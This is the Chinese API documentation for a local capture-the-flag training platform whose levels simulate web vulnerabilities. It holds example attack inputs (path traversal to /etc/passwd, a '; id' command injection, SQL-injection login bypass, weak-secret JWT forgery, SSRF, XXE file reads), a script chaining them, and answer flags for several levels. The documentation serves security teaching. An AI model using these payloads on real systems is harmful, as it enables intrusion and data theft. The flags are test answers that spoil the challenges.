# ATF Lab API 文档

> ⚠️ **免责声明**
> 本项目是一个 **API 调动的** 学习与演示项目，**仅供本人自行娱乐与安全学习使用**。
> **请勿在互联网上公开发布、部署或传播**。
> 若因违反本约定造成任何后果，由使用者自行承担。

**版本**：2.0.0
**Base URL**：`http://127.0.0.1:8899`
**交互式文档**：[`/api/docs`](http://127.0.0.1:8899/api/docs)（Swagger UI） · [`/api/redoc`](http://127.0.0.1:8899/api/redoc)

---

## 目录

- [通用约定](#通用约定)
- [错误码](#错误码)
- [1. 系统](#1-系统)
- [2. 认证](#2-认证)
- [3. 关卡](#3-关卡)
- [4. 用户与排行](#4-用户与排行)
- [5. 管理后台](#5-管理后台)
- [6. 模拟交互](#6-模拟交互)
- [7. 压轴关 L37](#7-压轴关-l37)

---

## 通用约定

### 响应格式

**所有** `/api/v1/*` 接口统一返回：

```json
{
  "code": 0,
  "message": "ok",
  "data": {}
}
```

| 字段 | 类型 | 说明 |
|---|---|---|
| `code` | int | 业务状态码，`0` 表示成功 |
| `message` | string | 人类可读的提示信息 |
| `data` | object \| null | 业务数据，失败时可能为 `null` |

> 前端只需判断 `code === 0`。HTTP 状态码与 `code` 的对应关系见下表。

### 认证

除标注「无需认证」的接口外，请在请求头携带 JWT：

```
Authorization: Bearer <token>
```

token 通过 `/api/v1/auth/register` 或 `/api/v1/auth/login` 获取，默认有效期 7 天。

认证级别：

| 标记 | 含义 |
|---|---|
| 无需认证 | 直接访问 |
| 可选认证 | 未登录可访问，登录后返回个性化数据（如 `solved`、`unlocked_hints`） |
| 需登录 | 未登录返回 `1002` |
| 需管理员 | 非管理员返回 `1003` |

### 请求格式

- `Content-Type: application/json`
- 请求体字段均为 JSON
- 时间戳字段为 Unix 秒（浮点）

---

## 错误码

| code | 含义 | HTTP |
|---:|---|---:|
| 0 | 成功 | 200 |
| 1001 | 参数校验失败 | 400 |
| 1002 | 未登录 / token 无效或过期 | 401 |
| 1003 | 无权限（非管理员） | 403 |
| 1004 | 资源不存在 | 404 |
| 1005 | 资源冲突（用户名已占用等） | 409 |
| 1006 | 请求过于频繁 | 429 |
| 1007 | flag 错误（业务失败，非 HTTP 错误） | 200 |
| 1008 | 关卡未解锁 | 403 |
| 5000 | 服务器内部错误 | 500 |

**错误响应示例**：

```json
{
  "code": 1002,
  "message": "未登录或登录已过期",
  "data": null
}
```

**参数校验失败示例**：

```json
{
  "code": 1001,
  "message": "参数校验失败",
  "data": {
    "errors": [
      {
        "type": "string_too_short",
        "loc": ["body", "password"],
        "msg": "String should have at least 6 characters"
      }
    ]
  }
}
```

---

## 1. 系统

### GET `/api/v1/health`

健康检查（无需认证）。

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "status": "healthy",
    "app": "ATF Lab",
    "version": "2.0.0",
    "levels": 37,
    "users": 3,
    "netlab": [
      { "name": "ftp", "port": 2121, "requested_port": 2121,
        "fell_back": false, "running": true, "error": null, "host": "127.0.0.1" },
      { "name": "mysql", "port": 13306, "requested_port": 3306,
        "fell_back": true, "running": true, "error": null, "host": "127.0.0.1" }
    ],
    "server_time": 1789811638.35,
    "disclaimer": "本项目是一个 API 调动的学习与演示项目，仅供本人自行娱乐与安全学习使用。请勿在互联网上公开发布、部署或传播。"
  }
}
```

> `fell_back: true` 表示首选端口被系统占用，已自动回退到备用端口。

---

## 2. 认证

### POST `/api/v1/auth/register`

注册新用户（无需认证）。

**请求体**：

| 字段 | 类型 | 必填 | 约束 |
|---|---|---|---|
| `username` | string | 是 | 3-24 位，仅字母/数字/下划线/连字符 |
| `password` | string | 是 | **至少 8 位，需含字母和数字**，且不在弱口令黑名单 |
| `email` | string | 否 | 最长 120 位 |

```json
{
  "username": "alice",
  "password": "StrongPass123",
  "email": "alice@example.com"
}
```

**响应示例**：

```json
{
  "code": 0,
  "message": "注册成功",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
      "id": 1,
      "username": "alice",
      "email": "alice@example.com",
      "role": "admin",
      "created_at": 1789811638.59,
      "must_change_password": false
    },
    "is_first_user": true,
    "recovery_code": "gHE4-w4gZ-6DUA-UD5P",
    "recovery_notice": "请立即保存此恢复码。它是忘记密码时自助重置的唯一凭据，只显示这一次。"
  }
}
```

> 💡 **平台第一个注册的用户自动成为管理员**（`role: "admin"`），
> 此时 `is_first_user` 为 `true`。

> 🔑 **`recovery_code` 只在此处返回一次**，数据库仅存 PBKDF2 哈希。
> 前端应引导用户立即保存。忘记密码时用它调用 `/api/v1/auth/recover`。

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 用户名格式不合法 / 密码强度不足 |
| 1005 | 用户名已被占用 |

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 用户名格式不合法 / 密码过短 |
| 1005 | 用户名已被占用 |

---

### POST `/api/v1/auth/login`

登录（无需认证）。

**请求体**：

```json
{ "username": "alice", "password": "secret123" }
```

**响应示例**：

```json
{
  "code": 0,
  "message": "登录成功",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
      "id": 1, "username": "alice", "email": "alice@example.com",
      "role": "admin", "created_at": 1789811638.59
    }
  }
}
```

**错误**：

| code | 场景 |
|---:|---|
| 1002 | 用户名或密码错误 |

---

### GET `/api/v1/auth/me`

获取当前登录用户信息（需登录）。

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "id": 1, "username": "alice", "email": "alice@example.com",
    "role": "admin", "created_at": 1789811638.59,
    "must_change_password": false,
    "password_changed_at": 1789811700.12
  }
}
```

> `must_change_password` 为 `true` 时，前端会在**每一页顶部**显示红色警示横幅，
> 提醒用户修改初始密码。由部署流程自动创建的管理员该字段为 `true`。

---

### POST `/api/v1/auth/change-password`

修改自己的密码（需登录）。

**请求体**：

| 字段 | 类型 | 说明 |
|---|---|---|
| `old_password` | string | 当前密码 |
| `new_password` | string | 新密码，至少 8 位、含字母和数字 |

```json
{ "old_password": "InitPass123", "new_password": "NewStrongPass456" }
```

**响应示例**：

```json
{
  "code": 0,
  "message": "密码已更新",
  "data": {
    "user": {
      "id": 1, "username": "alice", "role": "admin",
      "must_change_password": false,
      "password_changed_at": 1789811800.55
    }
  }
}
```

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 新密码强度不足 / 与当前密码相同 |
| 1002 | 当前密码不正确 |

---

### POST `/api/v1/auth/recover`

**使用一次性恢复码重置密码**（无需登录）。

> 这是本项目提供的唯一自助找回密码方式。
> 刻意**不提供**任何通用后门密码。

**请求体**：

| 字段 | 类型 | 说明 |
|---|---|---|
| `username` | string | 用户名 |
| `recovery_code` | string | 注册时下发的恢复码，格式 `XXXX-XXXX-XXXX-XXXX` |
| `new_password` | string | 新密码，至少 8 位 |

```json
{
  "username": "alice",
  "recovery_code": "gHE4-w4gZ-6DUA-UD5P",
  "new_password": "BrandNewPass789"
}
```

**成功响应**：

```json
{
  "code": 0,
  "message": "密码已重置",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": { "id": 1, "username": "alice", "role": "admin",
              "must_change_password": false },
    "recovery_code": "mK3p-Qw8z-Nv2x-Rt5y",
    "recovery_notice": "密码已重置。这是你的新恢复码，旧码已失效，请立即保存。"
  }
}
```

**行为说明**：

- **恢复码是一次性的**：使用后立即失效，并自动生成新码返回
- 用旧码再次请求将返回 `1002`
- 成功后 `must_change_password` 被清除

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 新密码强度不足 |
| 1002 | 用户名或恢复码不正确（**不区分**，防账号枚举） |
| 1006 | 账号因多次失败被锁定 |

---

### POST `/api/v1/auth/regenerate-recovery`

重新生成恢复码（需登录）。用于旧码可能泄露时主动轮换。

**响应示例**：

```json
{
  "code": 0,
  "message": "恢复码已重新生成",
  "data": {
    "recovery_code": "aB7c-De9f-Gh2j-Kl4m",
    "recovery_notice": "旧恢复码已失效。请立即保存新的恢复码，它只显示这一次。"
  }
}
```

---

### 登录限流说明

`/api/v1/auth/login` 与 `/api/v1/auth/recover` 均受账号级限流保护：

| 项目 | 值 |
|---|---|
| 失败阈值 | 连续 5 次 |
| 锁定时长 | 15 分钟 |
| 锁定期内行为 | 即使密码正确也返回 `1006` |
| 解除方式 | 等待自动解锁，或管理员执行 `python -m backend.admin unlock --user <名>` |

---

## 3. 关卡

### GET `/api/v1/levels`

获取关卡列表（可选认证）。

**查询参数**：

| 参数 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `category` | string | 空 | 按分类精确筛选，如 `Web 安全` |
| `difficulty` | int | 0 | 按难度筛选（1-5），`0` 表示全部 |
| `keyword` | string | 空 | 关键词搜索（匹配名称、目标、分类、标签） |

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "levels": [
      {
        "id": "L01",
        "name": "源码里的注释",
        "category": "Web 安全",
        "difficulty": 1,
        "objective": "开发者在页面源码中留下了一段注释，里面藏着本关 flag。找到它。",
        "points": 50,
        "tags": ["信息泄露", "源码审计"],
        "hint_count": 3,
        "free_hints": 1,
        "simulated": true,
        "special": null,
        "solved": false,
        "unlocked_hints": 0,
        "hints": [
          { "index": 0, "text": "浏览器右键 → 查看网页源代码，留意 HTML 注释。", "unlocked": false }
        ],
        "writeup": null,
        "unlocked": true
      }
    ],
    "total": 37,
    "categories": [
      { "category": "Web 安全", "total": 15, "solved": 0, "points": 1900 }
    ],
    "solved_count": 0,
    "total_count": 37,
    "total_points": 4830,
    "earned_points": 0
  }
}
```

> ⚠️ **安全说明**：响应中**不含 flag 明文**。
> 未解锁的提示 `text` 字段仍会返回但 `unlocked: false`（前端可选择不渲染）；
> 未通关关卡的 `writeup` 为 `null`。

---

### GET `/api/v1/levels/{level_id}`

获取关卡详情（可选认证）。字段同列表中的单个元素。

**错误**：

| code | 场景 |
|---:|---|
| 1004 | 关卡不存在 |

---

### POST `/api/v1/levels/{level_id}/submit`

提交 flag 校验（需登录）。

**请求体**：

```json
{ "flag": "flag{html_comment_leak}" }
```

**成功响应**：

```json
{
  "code": 0,
  "message": "正确！已记录通关",
  "data": {
    "correct": true,
    "first_solve": true,
    "points_awarded": 50,
    "solved_count": 1,
    "total_count": 37,
    "writeup": "信息泄露是最常见的低危漏洞……",
    "all_cleared": false
  }
}
```

**错误 flag 响应**（HTTP 200，业务失败）：

```json
{
  "code": 0,
  "message": "flag 不正确，再想想",
  "data": { "correct": false }
}
```

> 说明：flag 错误不算 HTTP 错误，返回 `code: 0` 但 `data.correct: false`。

**重复通关**：`first_solve: false`，`points_awarded: 0`（不重复计分）。

**错误**：

| code | 场景 |
|---:|---|
| 1004 | 关卡不存在 |
| 1008 | 关卡未解锁（L37 需先通关 5 关） |

---

### POST `/api/v1/levels/{level_id}/hint/{index}`

解锁一条提示（需登录）。`index` 从 `0` 开始。

**响应示例**：

```json
{
  "code": 0,
  "message": "提示已解锁",
  "data": {
    "index": 0,
    "text": "浏览器右键 → 查看网页源代码，留意 HTML 注释。",
    "unlocked_hints": 1,
    "hint_count": 3,
    "is_free": true
  }
}
```

**错误**：

| code | 场景 |
|---:|---|
| 1001 | index 越界 |

---

## 4. 用户与排行

### GET `/api/v1/leaderboard`

排行榜（可选认证）。

**查询参数**：

| 参数 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `limit` | int | 50 | 返回条数，1-200 |

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "entries": [
      { "rank": 1, "user_id": 1, "username": "alice",
        "role": "admin", "solved_count": 12, "points": 1450 }
    ],
    "my_rank": 1,
    "total_players": 3
  }
}
```

> 排序规则：总得分降序，同分者以**最早通关时间**升序。

---

### GET `/api/v1/me/profile`

我的个人主页（需登录），含徽章。

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "id": 1,
    "username": "alice",
    "role": "admin",
    "created_at": 1789811638.59,
    "solved_count": 12,
    "total_count": 37,
    "points": 1450,
    "max_points": 4830,
    "badges": [{ "id": "first_blood", "name": "初次交锋",
                 "description": "通关第一关", "earned": true }],
    "solved_levels": [
      { "id": "L01", "name": "源码里的注释", "category": "Web 安全",
        "difficulty": 1, "points": 50 }
    ],
    "progress_percent": 32.4,
    "all_badges": [
      { "id": "first_blood", "name": "初次交锋",
        "description": "通关第一关", "earned": true },
      { "id": "reaper", "name": "清算者",
        "description": "完成 REAPER 行动压轴关", "earned": false }
    ]
  }
}
```

**徽章清单**：

| id | 名称 | 条件 |
|---|---|---|
| `first_blood` | 初次交锋 | 通关第一关 |
| `web_novice` | Web 新秀 | 通关 5 个 Web 安全关卡 |
| `web_master` | Web 大师 | 通关全部 15 个 Web 安全关卡 |
| `crypto_fan` | 密码学徒 | 通关 3 个密码学关卡 |
| `forensics_eye` | 取证之眼 | 通关 3 个取证分析关卡 |
| `net_prober` | 网络探针 | 通关 3 个网络渗透关卡 |
| `half_way` | 过半征程 | 通关一半以上教学关 |
| `reaper` | 清算者 | 完成 REAPER 行动压轴关 |
| `completionist` | 全境通关 | 通关全部关卡 |

---

### GET `/api/v1/users/{username}`

查看他人公开主页（无需认证）。字段同 `/api/v1/me/profile`，但不含 `all_badges`。

**错误**：

| code | 场景 |
|---:|---|
| 1004 | 用户不存在 |

---

### GET `/api/v1/progress`

我的全部通关记录（需登录）。

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "solves": [
      { "level_id": "L01", "points": 50, "solved_at": 1789811700.12 }
    ],
    "count": 1
  }
}
```

---

## 5. 管理后台

> 全部接口**需管理员**。平台第一个注册用户自动成为管理员。

### GET `/api/v1/admin/stats`

答题统计。

**响应示例**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "total_users": 3,
    "total_solves": 25,
    "total_submissions": 61,
    "correct_submissions": 25,
    "accuracy": 41.0,
    "total_levels": 37,
    "per_level": [
      { "level_id": "L01", "name": "源码里的注释", "category": "Web 安全",
        "difficulty": 1, "points": 50, "solve_count": 3, "submit_count": 5 }
    ],
    "recent_solves": [
      { "level_id": "L01", "username": "alice", "solved_at": 1789811700.12 }
    ]
  }
}
```

---

### GET `/api/v1/admin/levels`

关卡列表（含 flag 明文，仅管理员可见）。

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "levels": [
      { "id": "L01", "name": "源码里的注释", "category": "Web 安全",
        "difficulty": 1, "points": 50,
        "objective": "...", "flag": "flag{html_comment_leak}",
        "hint_count": 3, "tags": ["信息泄露"], "simulated": true,
        "special": null, "builtin": true }
    ]
  }
}
```

---

### POST `/api/v1/admin/levels`

新增或覆盖关卡。

**请求体**：

| 字段 | 类型 | 必填 | 约束 |
|---|---|---|---|
| `id` | string | 是 | 2-16 位；建议自定义关用 `C` 开头 |
| `name` | string | 是 | 1-80 位 |
| `category` | string | 是 | 1-40 位 |
| `difficulty` | int | 否 | 1-5，默认 1 |
| `objective` | string | 是 | 1-1000 位 |
| `writeup` | string | 否 | 最长 8000 位 |
| `flag` | string | 是 | 1-200 位 |
| `points` | int | 否 | 0-10000，默认 100 |
| `tags` | array | 否 | 字符串数组 |
| `hints` | array | 是 | **至少 3 条** |

```json
{
  "id": "C01",
  "name": "自定义关卡示例",
  "category": "Web 安全",
  "difficulty": 2,
  "objective": "找到隐藏的 flag",
  "flag": "flag{custom_level}",
  "points": 100,
  "tags": ["自定义"],
  "hints": ["提示一", "提示二", "提示三"],
  "writeup": "原理讲解……"
}
```

**响应**：

```json
{ "code": 0, "message": "关卡已保存", "data": { "level_id": "C01" } }
```

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 提示少于 3 条 / 字段约束不满足 |

---

### DELETE `/api/v1/admin/levels/{level_id}`

删除自定义关卡。

> ⚠️ 内置关卡（非 `C` 开头）**不允许删除**，返回 `1003`。可通过 POST 覆盖。

```json
{ "code": 0, "message": "关卡已删除", "data": { "level_id": "C01" } }
```

---

### GET `/api/v1/admin/users`

用户列表。

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "users": [
      { "id": 1, "username": "alice", "email": "alice@example.com",
        "role": "admin", "created_at": 1789811638.59,
        "last_login_at": 1789811800.0,
        "solved_count": 12, "points": 1450 }
    ]
  }
}
```

---

## 6. 模拟交互

> ⚠️ **这些接口返回的全部是受控模拟数据**，响应体带 `_simulation: true` 与
> `_simulation_notice` 标记。它们**不执行任何真实操作**。

### 通用说明

各关卡的模拟交互端点按关卡类型分派：

| 方法 | 路径 | 适用关卡 | 参数 |
|---|---|---|---|
| GET | `/api/v1/sim/level/{id}/page` | L01 L02 L03 L19 L22-L26 L30 L31 L34-L36 | 无 |
| GET | `/api/v1/sim/level/{id}/file?name=` | L06 | `name` 路径 |
| GET | `/api/v1/sim/level/{id}/search?q=` | L09 | `q` 搜索词 |
| GET | `/api/v1/sim/level/{id}/profile?user_id=` | L08 | `user_id` |
| POST | `/api/v1/sim/level/{id}/login` | L04 L05 | `{username, password}` |
| POST | `/api/v1/sim/level/{id}/ping` | L07 | `{ip}` |
| POST | `/api/v1/sim/level/{id}/fetch` | L11 | `{url}` |
| POST | `/api/v1/sim/level/{id}/upload` | L12 | `{filename, size}` |
| POST | `/api/v1/sim/level/{id}/deserialize` | L13 | `{payload}` |
| POST | `/api/v1/sim/level/{id}/parse` | L14 | `{xml}` |
| POST | `/api/v1/sim/level/{id}/transfer` | L10 | `{to, amount}` |

### 示例：路径穿越（L06）

```
GET /api/v1/sim/level/L06/file?name=../../etc/passwd
```

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "path": "/etc/passwd",
    "content": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:...",
    "traversal_detected": true,
    "_simulation": true,
    "_simulation_notice": "本响应由 ATF Lab 教学沙箱生成，为受控模拟数据，不对应任何真实系统。"
  }
}
```

> 读取的是**内存中的虚拟文件树**，不触碰真实文件系统。

### 示例：命令注入（L07）

```
POST /api/v1/sim/level/L07/ping
{ "ip": "127.0.0.1; id" }
```

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "input": "127.0.0.1; id",
    "injected": true,
    "detected_by": ["命令分隔符"],
    "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)  [SIMULATED]",
    "note": "命令未被执行，以上为预置回显文本。",
    "_simulation": true,
    "_simulation_notice": "..."
  }
}
```

> **不调用任何真实命令执行接口**。

### 示例：SSRF（L11）

```
POST /api/v1/sim/level/L11/fetch
{ "url": "http://internal.helios-sim.invalid/archive" }
```

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "url": "http://internal.helios-sim.invalid/archive",
    "fetched": true,
    "status": 200,
    "body": {
      "service": "Helios Internal Archive",
      "records": [ { "codename": "PROJECT_REAPER", "classification": "TOP-SECRET" } ],
      "archive_key": "HL-ARCHIVE-KEY-7f3a91"
    },
    "note": "目标为应用内置模拟端点，未发起真实网络请求。",
    "_simulation": true
  }
}
```

**外部地址会被拒绝**（`1001`）：

```json
{
  "code": 1001,
  "message": "教学沙箱限制：仅允许访问内置模拟端点，不代理任何外部连接",
  "data": {
    "allowed_targets": [
      "http://127.0.0.1:8899/api/v1/finale/mock/archive",
      "http://internal.helios-sim.invalid/archive",
      "http://localhost:8899/api/v1/mock-internal/archive-index"
    ]
  }
}
```

---

## 7. 压轴关 L37

> ⚠️ **REAPER 行动**是一条完整的六阶段模拟攻击链。
> 所有操作均为受控模拟，不具备任何真实攻击能力。

**解锁条件**：通关至少 **5 个**教学关。未达标时 `/submit` 返回 `1008`。

### GET `/api/v1/finale/briefing`

任务简报（无需认证）。

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "codename": "REAPER",
    "role": "白帽渗透测试员",
    "target": "Helios 生物科技 员工门户",
    "mission": "内部档案 PROJECT_REAPER 缺少 41 份知情同意书……",
    "stages": [
      { "stage": 1, "title": "员工名录泄露" },
      { "stage": 2, "title": "SQL 注入绕过登录" },
      { "stage": 3, "title": "JWT 弱密钥提权" },
      { "stage": 4, "title": "SSRF 探测内网" },
      { "stage": 5, "title": "XXE 读取档案索引" },
      { "stage": 6, "title": "销毁 REAPER 档案" }
    ],
    "disclaimer": "本关卡为教学模拟……"
  }
}
```

---

### GET `/api/v1/finale/progress`

我的阶段进度（可选认证）。

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stages": [
      { "stage": 1, "title": "员工名录泄露", "reached": true, "reached_at": 1789811900.1 }
    ],
    "completed_stages": 1,
    "total_stages": 6,
    "destroyed": false,
    "logged_in": true
  }
}
```

---

### 阶段 1 · GET `/api/v1/finale/legacy/employees`

员工名录泄露（可选认证）。

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stage": 1,
    "title": "员工名录泄露",
    "endpoint": "/api/v1/finale/legacy/employees",
    "note": "这是门户改版后忘记下线的旧接口，返回了完整员工名录。",
    "employees": [
      { "id": 1, "username": "m.chen", "employee_id": "HX-2291",
        "email": "m.chen@helios-sim.invalid", "role": "employee", "department": "R&D" }
    ],
    "leads_to": "拿到 m.chen 的工号 HX-2291，用它作为登录用户名进入阶段 2。"
  }
}
```

---

### 阶段 2 · POST `/api/v1/finale/login`

门户登录，**存在 SQL 注入**（可选认证）。

**请求体**：

```json
{ "username": "' OR '1'='1", "password": "x" }
```

**成功响应**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stage": 2,
    "title": "SQL 注入绕过登录",
    "injected": true,
    "query_template": "SELECT id, username, role FROM portal_users WHERE username = '<input>' AND password = '<input>'",
    "session_token": "hl-sess-8f2a41c9d7e3",
    "role": "employee",
    "employee_jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "jwt_hint": "拿去解码看看 payload，注意签名用的密钥很弱。",
    "leads_to": "员工会话可访问门户，但管理员面板在 /api/v1/finale/admin，需要 admin 身份。"
  }
}
```

**无注入时**返回 `1002`。

> **不拼接任何真实 SQL、不连接任何数据库**。

---

### 阶段 3 · GET `/api/v1/finale/admin`

管理员面板，需 `role: admin` 的模拟 JWT（可选认证）。

**认证方式**（二选一）：

- Query：`?token=<JWT>`
- Header：`Authorization: Bearer <JWT>`

**JWT 要求**：

| 字段 | 要求 |
|---|---|
| 算法 | `HS256` |
| 密钥 | `helios-dev-secret`（本关专用弱密钥） |
| `aud` | `helios-portal-sim` |
| `iss` | `helios-portal` |
| `role` | `admin` |

**成功响应**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stage": 3,
    "title": "JWT 弱密钥提权",
    "admin_granted": true,
    "panel": "Helios 内部档案管理面板",
    "features": ["服务健康检查", "档案检索", "档案销毁"],
    "leads_to": "健康检查功能存在 SSRF，可用它探测内部档案服务。"
  }
}
```

**错误**：

| code | 场景 |
|---:|---|
| 1002 | token 无效（签名错误/过期/audience 不匹配） |
| 1003 | token 有效但 `role` 不是 `admin` |

> [!IMPORTANT]
> **安全隔离**：本关的弱密钥与平台真实密钥（`ATF_SECRET_KEY`）**完全分离**，
> `audience` 也不同。用本关弱密钥伪造的 token **无法通过平台任何真实接口的鉴权**
> （调用 `/api/v1/auth/me` 会返回 `1002`）。此隔离有自动化测试覆盖。

---

### 阶段 4 · POST `/api/v1/finale/health-check`

服务健康检查，**存在 SSRF**（可选认证）。

**请求体**：

```json
{ "url": "http://internal.helios-sim.invalid/archive" }
```

**允许的目标**：

| URL |
|---|
| `http://internal.helios-sim.invalid/archive` |
| `http://127.0.0.1:8899/api/v1/finale/mock/archive` |

**成功响应**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stage": 4,
    "title": "SSRF 探测内网",
    "url": "http://internal.helios-sim.invalid/archive",
    "fetched": true,
    "status": 200,
    "body": {
      "service": "Helios Internal Archive",
      "version": "3.4.1-sim",
      "records": [
        { "codename": "PROJECT_REAPER", "classification": "TOP-SECRET",
          "path": "/archive/reaper", "consent_forms": "41/47 缺失" }
      ],
      "archive_key": "HL-ARCHIVE-KEY-7f3a91"
    },
    "note": "目标为应用内置模拟端点，未发起真实网络请求。"
  }
}
```

**非白名单 URL** → `1001`。

> **不发起任何真实网络请求**。

---

### 阶段 5 · POST `/api/v1/finale/archive/search`

档案检索，**存在 XXE**（可选认证）。

**请求体**：

| 字段 | 说明 |
|---|---|
| `xml` | 含外部实体声明的 XML |
| `archive_key` | 阶段 4 获取的 key |

```json
{
  "xml": "<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY x SYSTEM \"file:///etc/helios/archive.conf\">\n]>\n<r>&x;</r>",
  "archive_key": "HL-ARCHIVE-KEY-7f3a91"
}
```

**成功响应**：

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stage": 5,
    "title": "XXE 读取档案索引",
    "entities": [{ "name": "x", "system": "file:///etc/helios/archive.conf" }],
    "entity_values": {
      "x": "archive_root=/srv/archive\nreaper_index=/archive/reaper/manifest.xml\n"
    },
    "manifest": {
      "project": "PROJECT_REAPER", "codename": "REAPER",
      "records_total": 47, "consent_missing": 41, "classification": "TOP-SECRET"
    },
    "destruction_token": "DESTROY-3f10fcd6b70f0a4d",
    "note": "以上为预置文本，未读取任何真实文件。"
  }
}
```

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 未检测到外部实体声明 |
| 1003 | `archive_key` 无效 |

> **不使用任何真实 XML 解析库**，仅用正则识别实体声明并返回预置文本。

---

### 阶段 6 · GET `/api/v1/finale/archive/destroy/preview`

销毁前预览（无需认证）。

```json
{
  "code": 0,
  "message": "ok",
  "data": {
    "stage": 6,
    "title": "销毁 REAPER 档案",
    "warning": "此操作将把 PROJECT_REAPER 档案标记为已销毁。本次操作作用于教学模拟数据表 sim_archive_records。",
    "confirm_phrase": "CONFIRM DESTRUCTION",
    "records": [
      { "id": 1, "project": "HELIOS", "codename": "PROJECT_REAPER",
        "classification": "TOP-SECRET", "status": "ACTIVE" }
    ]
  }
}
```

---

### 阶段 6 · POST `/api/v1/finale/archive/destroy`

执行销毁（**需登录**）。

**请求体**：

```json
{
  "destruction_token": "DESTROY-3f10fcd6b70f0a4d",
  "confirm": "CONFIRM DESTRUCTION"
}
```

**成功响应**：

```json
{
  "code": 0,
  "message": "REAPER 档案已在教学模拟数据中被标记销毁",
  "data": {
    "stage": 6,
    "title": "销毁 REAPER 档案",
    "destroyed": true,
    "already_destroyed": false,
    "target": "PROJECT_REAPER",
    "simulated": true,
    "note": "PROJECT_REAPER 已在教学模拟数据表中被标记为 DESTROYED。此操作仅影响 sim_archive_records 表，未删除任何真实数据。"
  }
}
```

**错误**：

| code | 场景 |
|---:|---|
| 1001 | 确认短语不正确 |
| 1003 | `destruction_token` 无效或已过期（每日轮换） |
| 1004 | 模拟档案记录不存在 |

> [!IMPORTANT]
> **安全边界**：本操作只执行
> `UPDATE sim_archive_records SET status='DESTROYED' WHERE codename='PROJECT_REAPER'`，
> **不删除任何行**，不影响任何真实数据，不影响平台其他部分。

---

### 通关

销毁成功后，提交 L37 的 flag：

```
POST /api/v1/levels/L37/submit
{ "flag": "flag{reaper_archive_destroyed}" }
```

---

## 附录：完整调用流程示例

```bash
BASE=http://127.0.0.1:8899
JQ() { python -c "import sys,json;d=json.load(sys.stdin);print(eval('d'+'$1'))"; }

# 1. 注册
TOKEN=$(curl -s -X POST $BASE/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter","password":"hunter123"}' | JQ "['data']['token']")

AUTH="Authorization: Bearer $TOKEN"

# 2. 通关 5 个教学关以解锁压轴关
for pair in "L01:flag{html_comment_leak}" \
            "L16:flag{caesar_shift_three}" \
            "L17:flag{nested_encoding_layers}" \
            "L18:flag{md5_password_cracked}" \
            "L22:flag{png_appended_data}"; do
  lid="${pair%%:*}"; fl="${pair#*:}"
  curl -s -X POST $BASE/api/v1/levels/$lid/submit -H "$AUTH" \
    -H 'Content-Type: application/json' -d "{\"flag\":\"$fl\"}" >/dev/null
done

# 3. 压轴关六阶段
curl -s $BASE/api/v1/finale/legacy/employees -H "$AUTH" >/dev/null

JWT=$(curl -s -X POST $BASE/api/v1/finale/login -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}' | JQ "['data']['employee_jwt']")

# 用弱密钥伪造 admin token
ADMIN_JWT=$(python - <<'PY'
import jwt, time
print(jwt.encode({
    "sub": "3", "username": "portal_admin", "role": "admin",
    "iat": int(time.time()), "exp": int(time.time()) + 3600,
    "aud": "helios-portal-sim", "iss": "helios-portal",
}, "helios-dev-secret", algorithm="HS256"))
PY
)

curl -s "$BASE/api/v1/finale/admin?token=$ADMIN_JWT" -H "$AUTH" >/dev/null

KEY=$(curl -s -X POST $BASE/api/v1/finale/health-check -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal.helios-sim.invalid/archive"}' | JQ "['data']['body']['archive_key']")

DTOK=$(curl -s -X POST $BASE/api/v1/finale/archive/search -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d "{\"archive_key\":\"$KEY\",\"xml\":\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r [<!ENTITY x SYSTEM \\\"file:///etc/helios/archive.conf\\\">]><r>&x;</r>\"}" \
  | JQ "['data']['destruction_token']")

curl -s -X POST $BASE/api/v1/finale/archive/destroy -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d "{\"destruction_token\":\"$DTOK\",\"confirm\":\"CONFIRM DESTRUCTION\"}"

# 4. 提交通关 flag
curl -s -X POST $BASE/api/v1/levels/L37/submit -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"flag":"flag{reaper_archive_destroyed}"}'
```

---

<div align="center">

**⚠️ 本项目仅供教学演示，请勿在互联网上公开发布、部署或传播。**

</div>
